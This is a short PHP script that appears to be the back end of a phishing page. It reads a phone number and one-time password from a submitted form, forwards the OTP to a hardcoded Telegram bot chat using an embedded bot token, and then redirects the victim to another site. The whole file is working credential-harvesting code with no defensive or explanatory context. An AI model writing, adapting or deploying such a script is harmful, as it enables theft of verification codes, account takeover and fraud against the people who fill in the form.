<?php
 $token="5912247911:AAF5D53I7Q89_juB6I-Je9jJMoC5ENYgKD0";

//getting input from post method 
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the form values
    $number = $_POST['number'] ?? '';
    $otp = $_POST['otp'] ?? '';
};

/////macinize

$message = "otp: $otp " ;
$data = [
 'text' => $message,
 'chat_id' => '1352942997'
];

$hmm = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?" .http_build_query($data));


header("Location: https://cl.com/"); 

?>

